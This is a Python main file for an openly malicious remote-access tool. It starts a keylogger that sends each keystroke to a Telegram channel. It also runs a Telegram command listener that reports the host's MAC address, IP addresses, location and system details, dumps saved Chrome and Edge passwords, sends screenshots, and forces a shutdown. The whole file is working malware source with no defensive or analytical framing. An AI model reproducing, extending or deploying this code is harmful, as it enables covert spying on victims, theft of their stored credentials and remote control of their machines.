# main.py
import os
import sys
import threading
from pynput.keyboard import Listener
import meli0das
from telegram import check_telegram, send_telegram
from get_info import SystemInfo, IPAddress, get_mac
from edge import EdgePasswordDumper
from chrome import ChromePasswordDumper
from screenshot import send_screenshot

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


def telegram_listener():
    last_update_id = -1
    
    while True:
        command, message_id, last_update_id = check_telegram(last_update_id)
        if command:
            print(f'Received command: {command}')

            command_lower = command.lower()
            if command_lower == '/mac':
                mac_address = get_mac()
                send_telegram(f'MAC Address: {mac_address}')

            elif command_lower == '/local_ip':
                local_ip = IPAddress.get_local_ip()
                send_telegram(f'Local IP Address: {local_ip}')

            elif command_lower == '/public_ip':
                public_ip = IPAddress.get_public_ip()
                send_telegram(f'Public IP Address: {public_ip}')

            elif command_lower == '/location':
                public_ip = IPAddress.get_public_ip()
                location = IPAddress.get_location(public_ip)
                send_telegram(f'Location: {location}')

            elif command_lower == '/os':
                system_info = SystemInfo().get_os_info()
                send_telegram(f'System info: {system_info}')

            elif command_lower == '/configuration':
                system_info = SystemInfo()
                config_info = system_info.display_info()
                send_telegram(f'System Configuration: \n{config_info}')

            elif command_lower == '/chrome_password':
                dumper = ChromePasswordDumper()
                dumper.dump_passwords()
            
            elif command_lower == '/edge_password':
                dumper = EdgePasswordDumper()
                dumper.dump_passwords()
            elif command_lower == '/screenshot':
                send_screenshot()
                send_telegram('Screenshot taken and sent!')

            elif command_lower == '/shutdown':
                send_telegram('Shutting down the system...')
                os.system('shutdown /s /f /t 0')

def on_press(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)
        send_telegram(key_str)
    except Exception as e:
        print(f'Error logging key: {e}')

def keylogger_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ =='__main__':
    
    asii_banner = meli0das.show()

    dumper = ChromePasswordDumper()
    secret_key = dumper.get_secret_key()   
    if secret_key: 
        print("Secret key retrieved successfully. Starting password dump.")
    else: 
        print('"[ERR] Unable to retrieve secret key. Exiting."')
    
    telegram_thread = threading.Thread(target=telegram_listener)
    keylogger_thread = threading.Thread(target=keylogger_listener)
    
    telegram_thread.start()
    keylogger_thread.start()
    
    telegram_thread.join()
    keylogger_thread.join()